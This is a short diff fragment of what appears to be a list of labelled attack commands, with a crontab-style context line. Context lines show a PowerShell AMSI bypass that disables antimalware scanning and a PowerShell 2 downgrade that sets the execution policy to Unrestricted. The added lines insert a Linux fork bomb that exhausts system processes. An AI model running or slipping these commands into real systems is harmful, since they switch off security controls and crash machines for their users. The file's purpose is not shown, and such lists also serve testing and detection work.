@@ -208,5 +208,6 @@ MAILTO=root
 	powershell -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
 # Unrestrict Powershell Execution Policy
 	powershell.exe -Version 2 -Command "& {Set-ExecutionPolicy -ExecutionPolicy Unrestricted}"
-
+# Linux Forkbomb
+	 :(){ :|: & };:
 
